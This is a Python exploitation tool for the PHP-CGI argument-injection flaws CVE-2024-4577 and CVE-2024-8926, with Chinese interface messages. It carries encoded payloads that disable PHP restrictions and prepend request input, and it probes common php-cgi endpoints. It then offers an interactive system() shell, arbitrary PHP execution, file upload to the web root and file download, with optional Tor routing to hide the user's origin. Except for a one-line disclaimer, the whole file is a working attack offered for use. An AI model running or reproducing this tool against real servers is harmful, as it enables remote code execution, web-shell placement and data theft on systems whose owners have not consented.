import requests
import base64
import sys
import os
import urllib3
import chardet
from urllib.parse import urlparse
import banner

try:
    from requests_tor import RequestsTor
except ImportError:
    print("[!] 警告：請安裝 `requests-tor` 以支援 Tor 代理: pip install requests-tor")
    RequestsTor = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 全域設定
DEFAULT_TIMEOUT = 10
timeout_value = DEFAULT_TIMEOUT
enable_log = "--log" in sys.argv
use_tor = "--tor" in sys.argv  # 檢查是否啟用 Tor
tor_session = None

# Tor 模式啟動
if use_tor and RequestsTor:
    print("[*] 嘗試啟動 Tor 代理...")
    tor_session = RequestsTor()
    try:
        response = tor_session.get("https://check.torproject.org/api/ip", timeout=10)
        if response.status_code == 200:
            ip_check = response.json().get("IP", "未知")
            print(f"[*] Tor 代理已啟用，當前出口 IP: {ip_check}")
        else:
            print("[!] 警告：Tor 代理回應異常，請確認 Tor 是否正在運行！")
    except Exception as e:
        print(f"[!] 錯誤：無法連接 Tor 代理，請確認 Tor 是否啟動！\n[錯誤訊息] {e}")
        sys.exit(1)

PAYLOADS = {
    "CVE-2024-4577": "%ADd+disable_functions%3d%26+%ADd+disable_classes%3d%26+%ADd+open_basedir%3d+%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+allow_url_fopen%3d1+%ADd+auto_prepend_file%3dphp://input",
    "CVE-2024-8926": "%a8-d%a8+disable_functions%3d%26+%a8-d%a8+disable_classes%3d%26+%a8-d%a8+open_basedir%3d+%a8-d%a8+cgi.force_redirect%3d0+%a8-d%a8+cgi.redirect_status_env+%a8-d%a8+allow_url_include%3d1+%a8-d%a8+allow_url_fopen%3d1+%a8-d%a8+auto_prepend_file%3dphp://input"
}

def Show_Disclaimer():
    print("""
[*] CVE-2024-4577 & CVE-2024-8926 Exploitation Tool
[*] Version: 1.1.1
[*] Author: Night-have-dreams
[*] 僅供合法安全測試，請勿用於未經授權的系統！
[*] 使用者應自行承擔使用本工具所產生的風險
""")

def decode_response(response):
    detected = chardet.detect(response.content)
    encoding = detected.get('encoding')
    return response.content.decode(encoding, errors='replace') if encoding else response.content.decode('utf-8', errors='replace')

def send_request(url, data, timeout=None):
    try:
        if use_tor:
            response = tor_session.post(url, data=data, timeout=timeout)
        else:
            response = requests.post(url, data=data, verify=False, timeout=timeout)
        
        return decode_response(response)
    except Exception as e:
        print(f"[!] 請求錯誤: {e}")
        return None

def choose_endpoint(url, payload_key):
    endpoints = [
        "/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe",
        "/php-cgi.exe", "/cgi/php-cgi.exe", "/php.exe",
        "/cgi-bin/php.exe", "/cgi/php.exe",
        "/index.php", "/"
    ]
    test_payload = "<?php echo 'TEST_VULNTEST_CVE-2024-4577'; die(); ?>"
    for ep in endpoints:
        target_url = f"{url}{ep}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, test_payload, timeout_value)
        if resp and 'TEST_VULNTEST_CVE-2024-4577' in resp:
            print(f"[+] 找到漏洞入口 : {ep} (漏洞: {payload_key})")
            return ep
    print(f"[-] 未找到漏洞 (CVE: {payload_key})")
    return None

def get_unique_filepath(directory, filename):
    base, ext = os.path.splitext(filename)
    candidate = os.path.join(directory, filename)
    i = 1
    while os.path.exists(candidate):
        candidate = os.path.join(directory, f"{base}_{i}{ext}")
        i += 1
    return candidate

def exploit_shell(url, endpoint, payload_key):
    print("[*] 輸入命令，輸入 exit 結束，可使用 --save [路徑] 儲存單次輸出：")
    host = urlparse(url).netloc
    log_path = os.path.join("log", f"{host}.log") if enable_log else None
    if enable_log and not os.path.exists("log"):
        os.makedirs("log")

    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() == "exit":
            break
        parts = cmd.split("--save")
        real_cmd = parts[0].strip()
        save_path = parts[1].strip() if len(parts) > 1 else None

        if save_path == "":
            save_dir = os.path.join(os.getcwd(), "output")
            if not os.path.exists(save_dir):
                os.makedirs(save_dir)
            save_path = os.path.join(save_dir, f"{real_cmd.replace(' ', '_')}.txt")
        
        payload = f"<?php system('{real_cmd}'); die(); ?>"
        target_url = f"{url}{endpoint}?{PAYLOADS[payload_key]}"
        
        resp = send_request(target_url, payload, timeout_value)
        output = resp.strip() if resp else ""

        print(output)

        if save_path:
            save_path = os.path.abspath(save_path)
            if os.path.exists(save_path):
                save_path = get_unique_filepath(os.path.dirname(save_path), os.path.basename(save_path))
            with open(save_path, "w", encoding="utf-8") as f:
                f.write(output)
            print(f"[+] 輸出結果已儲存至 {save_path}")

        if enable_log:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"CMD: {real_cmd}\n{output}\n{'-'*20}\n")

def custom_php_mode(url, endpoint, payload_key):
    print("[*] 輸入PHP程式碼，輸入 EOF 結束，可使用 --save [路徑] 儲存輸出：")
    php_code = ""
    save_path = None
    while True:
        line = input()
        if line.strip().startswith("EOF"):
            parts = line.split("--save")
            if len(parts) > 1:
                save_path = parts[1].strip()
                if save_path == "":
                    save_dir = os.path.join(os.getcwd(), "output")
                    if not os.path.exists(save_dir):
                        os.makedirs(save_dir)
                    save_path = os.path.join(save_dir, "php_output.txt")
            break
        php_code += line + "\n"

    payload = f"<?php {php_code}; die(); ?>"
    target_url = f"{url}{endpoint}?{PAYLOADS[payload_key]}"
    resp = send_request(target_url, payload, timeout_value)
    output = resp.strip() if resp else ""

    print(output)

    if save_path:
        save_path = os.path.abspath(save_path)
        if os.path.exists(save_path):
            save_path = get_unique_filepath(os.path.dirname(save_path), os.path.basename(save_path))
        with open(save_path, "w", encoding="utf-8") as f:
            f.write(output)
        print(f"[+] PHP輸出結果已儲存至 {save_path}")

def get_remote_docroot(url, endpoint, payload_key):
    payload = "<?php echo $_SERVER['DOCUMENT_ROOT']; die(); ?>"
    target_url = f"{url}{endpoint}?{PAYLOADS[payload_key]}"
    resp = send_request(target_url, payload, timeout_value)
    return resp.strip() if resp else None

def upload_file(url, endpoint, payload_key):
    local = input("本地檔案路徑：").strip()
    remote = input("目標完整路徑（若留空將上傳至網站根目錄）：").strip()
    
    if remote == "":
        docroot = get_remote_docroot(url, endpoint, payload_key)
        if not docroot:
            print("[!] 無法取得網站根目錄，請手動指定完整路徑")
            return
        remote = os.path.join(docroot, os.path.basename(local))
        remote = remote.replace("\\", "/")
        print(f"[*] 已自動設定上傳路徑為: {remote}")

    try:
        with open(local, "rb") as f:
            encoded = base64.b64encode(f.read()).decode()
    except Exception as e:
        print(f"[!] 讀取本地檔案失敗: {e}")
        return
    
    payload = f"<?php file_put_contents('{remote}', base64_decode('{encoded}')); echo 'OK'; die(); ?>"
    resp = send_request(f"{url}{endpoint}?{PAYLOADS[payload_key]}", payload)

    print(resp.strip() if resp else "[!] 上傳失敗，無回應")

def download_file(url, endpoint, payload_key):
    remote = input("遠端檔案路徑：").strip()
    local = os.path.join("download", os.path.basename(remote))
    if not os.path.exists("download"):
        os.makedirs("download")
    payload = f"<?php echo base64_encode(file_get_contents('{remote}')); die(); ?>"
    resp = send_request(f"{url}{endpoint}?{PAYLOADS[payload_key]}", payload)
    if resp:
        with open(local, "wb") as f:
            f.write(base64.b64decode(resp.strip()))
        print(f"已下載至 {local}")

if __name__ == "__main__":
    
    # 播放開頭動畫
    use_tor = "--tor" in sys.argv
    banner.play_banner(use_tor)

    # 播放 Disclaimer
    Show_Disclaimer()
    
    if len(sys.argv) < 3 or sys.argv[1] != "-u":
        print("用法: python exploit.py -u <URL> [--timeout=秒] [--log] [--tor]")
        sys.exit(1)

    target = sys.argv[2]  
    
    # timeout 檢查邏輯
    timeout_value = 10  # 預設值
    for arg in sys.argv:
        if arg.startswith("--timeout="):  # 確保有 `=`
            parts = arg.split("=")
            if len(parts) != 2 or not parts[1].isdigit():
                print("[!] 錯誤：請使用正確格式 --timeout=<秒數>，例如 --timeout=10")
                sys.exit(1)
            timeout_int = int(parts[1])
            if timeout_int == 0:
                timeout_value = None  # 無限等待
                print("[*] 已設置為無限等待")
            elif timeout_int > 60:
                print("[!] 等待時間過久 (超過 60 秒)，如需要無限等待請使用 --timeout=0")
                sys.exit(1)
            elif timeout_int > 30:
                print("[!] 警告：timeout 超過 30 秒，測試可能會耗時較久")
                timeout_value = timeout_int
            else:
                timeout_value = timeout_int
                print(f"[*] 設定請求超時時間為 {timeout_value} 秒")
        elif arg == "--timeout":  # 如果 `--timeout` 沒有 `=`
            print("[!] 錯誤：請使用 --timeout=<秒數>，例如 --timeout=10")
            sys.exit(1)
    while True:
        selected_endpoint, selected_payload = None, None
        print("[*] 開始測試...")
        for p in PAYLOADS:
            ep = choose_endpoint(target, p)
            if ep:
                selected_endpoint, selected_payload = ep, p
                break
        if not selected_endpoint:
            print("[-] 無漏洞，請重新指定目標或退出")

        while selected_endpoint:
            print(f"\n[*] 當前目標: {target} (漏洞: {selected_payload})")
            print("模式選擇:")
            print("1) Shell模式 (使用system()執行命令)")
            print("2) PHP自訂義模式 (使用eval()執行任意代碼)")
            print("3) 上傳檔案")
            print("4) 下載檔案")
            print("5) 切換攻擊目標")
            print("6) 離開程式")

            choice = input(">> ").strip()
            if choice == "1":
                exploit_shell(target, selected_endpoint, selected_payload)
            elif choice == "2":
                custom_php_mode(target, selected_endpoint, selected_payload)
            elif choice == "3":
                upload_file(target, selected_endpoint, selected_payload)
            elif choice == "4":
                download_file(target, selected_endpoint, selected_payload)
            elif choice == "5":
                target = input("輸入新目標URL: ").strip()
                break
            elif choice == "6":
                print("[*] 程式結束")
                sys.exit(0)
            else:
                print("[!] 無效的選擇，請重新選擇")

        if not selected_endpoint:
            next_action = input("1) 重新輸入目標  2) 離開\n>> ").strip()
            if next_action == "1":
                target = input("輸入新目標URL: ").strip()
            else:
                print("[*] 程式結束")
                sys.exit(0)
